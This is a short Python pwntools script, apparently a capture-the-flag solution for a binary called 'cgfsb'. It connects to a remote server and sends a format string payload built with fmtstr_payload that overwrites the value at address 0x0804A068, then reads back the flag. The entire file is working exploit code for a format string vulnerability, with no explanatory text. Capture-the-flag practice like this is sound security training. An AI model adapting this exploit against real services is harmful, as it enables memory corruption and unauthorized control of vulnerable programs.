from pwn import *
import sys
#p = process("./cgfsb")
p = remote("111.198.29.45",30023)
payload = fmtstr_payload(10,{0x0804A068:8})
#gdb.attach(p,"b printf")
p.sendafter("name:\n","a")
p.sendlineafter("please:\n",payload)
print p.recvuntil("flag:\n")
print p.recv()
